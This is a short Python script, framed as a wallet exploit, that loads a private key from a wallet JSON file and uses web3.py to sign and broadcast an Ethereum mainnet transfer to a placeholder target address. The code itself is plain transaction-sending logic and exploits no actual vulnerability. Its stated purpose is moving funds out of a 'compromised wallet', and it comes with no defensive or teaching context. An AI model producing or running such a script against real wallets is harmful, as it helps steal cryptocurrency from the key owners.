import os
import json
from web3 import Web3
from eth_account import Account

# Configuration
WALLET_FILE_PATH = './wallet.json'  # Path to wallet JSON file
INFURA_URL = 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'

# Connect to the Ethereum network
def connect_to_ethereum(url):
    """Establish connection to the Ethereum node."""
    try:
        web3 = Web3(Web3.HTTPProvider(url))
        if web3.isConnected():
            print("Connected to Ethereum network.")
            return web3
        else:
            raise ConnectionError("Failed to connect to Ethereum node.")
    except Exception as e:
        print(f"Connection error: {e}")
        exit(1)

# Exploit the wallet vulnerability
def exploit_wallet(web3, wallet_file_path):
    """Exploit the wallet vulnerability to perform actions with the compromised wallet."""
    try:
        with open(wallet_file_path, 'r') as f:
            wallet_data = json.load(f)
            private_key = wallet_data.get('privateKey')
            if not private_key:
                raise ValueError("Private key not found in wallet file.")

            # Derive account from private key
            account = Account.privateKeyToAccount(private_key)
            print(f"Using account: {account.address}")

            # Define the transaction
            tx = {
                'to': '0xTargetAddress',  # Replace with target address
                'value': web3.toWei(0.01, 'ether'),
                'gas': 2000000,
                'gasPrice': web3.toWei('50', 'gwei'),
                'nonce': web3.eth.getTransactionCount(account.address),
                'chainId': 1  # Mainnet chain ID
            }

            # Sign and send the transaction
            signed_tx = web3.eth.account.signTransaction(tx, private_key)
            tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
            print(f"Transaction sent: {web3.toHex(tx_hash)}")

    except Exception as e:
        print(f"Wallet exploit failed: {e}")

if __name__ == "__main__":
    # Setup
    web3 = connect_to_ethereum(INFURA_URL)
    
    # Execute the wallet exploit
    exploit_wallet(web3, WALLET_FILE_PATH)
